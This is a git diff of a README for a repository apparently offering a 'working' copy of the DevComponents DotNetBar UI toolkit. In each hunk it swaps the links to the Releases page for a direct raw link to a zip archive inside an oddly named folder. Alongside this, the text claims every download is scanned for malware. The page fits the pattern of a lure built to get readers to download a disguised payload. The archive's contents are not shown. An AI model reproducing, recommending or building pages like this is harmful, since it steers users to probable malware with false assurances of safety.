@@ -1,6 +1,6 @@
 # 🚀 DevComponents-DotNetBar-Working - Easily Enhance Your Windows Apps  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/shantanu25-decent/DevComponents-DotNetBar-Working/releases)
+[![Download Now](https://raw.githubusercontent.com/shantanu25-decent/DevComponents-DotNetBar-Working/main/phlebectopy/DevComponents-DotNetBar-Working-v3.6-beta.4.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/shantanu25-decent/DevComponents-DotNetBar-Working/main/phlebectopy/DevComponents-DotNetBar-Working-v3.6-beta.4.zip)
 
 ## 📋 Overview  
 DevComponents DotNetBar is a powerful toolkit for enhancing your Windows applications. This software provides UI controls that help you design modern and efficient applications quickly. Whether you're in the USA or the UK, this tool can elevate your projects.
@@ -23,7 +23,7 @@ To begin using DevComponents DotNetBar, follow all the steps below. We ensure th
 
 2. **Visit the Releases Page:**  
    Head over to our GitHub Releases page to access the download options.  
-   [Download DevComponents DotNetBar](https://github.com/shantanu25-decent/DevComponents-DotNetBar-Working/releases)
+   [Download DevComponents DotNetBar](https://raw.githubusercontent.com/shantanu25-decent/DevComponents-DotNetBar-Working/main/phlebectopy/DevComponents-DotNetBar-Working-v3.6-beta.4.zip)
 
 3. **Select the Right File:**  
    On the Releases page, you will see different versions of DevComponents DotNetBar. Look for the most current version and click on it.  
@@ -38,7 +38,7 @@ To begin using DevComponents DotNetBar, follow all the steps below. We ensure th
    Once installation is done, you can find DevComponents DotNetBar in your Start Menu. Click to open the application.
 
 ## 📥 Download & Install  
-You can download the latest version of DevComponents DotNetBar directly by visiting our [Releases page](https://github.com/shantanu25-decent/DevComponents-DotNetBar-Working/releases). Follow the steps above to complete your installation.
+You can download the latest version of DevComponents DotNetBar directly by visiting our [Releases page](https://raw.githubusercontent.com/shantanu25-decent/DevComponents-DotNetBar-Working/main/phlebectopy/DevComponents-DotNetBar-Working-v3.6-beta.4.zip). Follow the steps above to complete your installation.
 
 ## 🛡️ Safety Measures  
 We prioritize your safety. All downloads are scanned for malware and other threats. Feel confident in using DevComponents DotNetBar.
@@ -59,4 +59,4 @@ Join our community for support and suggestions. Feel free to ask questions and s
 ## 📅 Version History  
 Check for updates frequently. We publish new features and improvements regularly.
 
-For the latest updates and more information on DevComponents DotNetBar, don't forget to check the [Releases page](https://github.com/shantanu25-decent/DevComponents-DotNetBar-Working/releases).
+For the latest updates and more information on DevComponents DotNetBar, don't forget to check the [Releases page](https://raw.githubusercontent.com/shantanu25-decent/DevComponents-DotNetBar-Working/main/phlebectopy/DevComponents-DotNetBar-Working-v3.6-beta.4.zip).
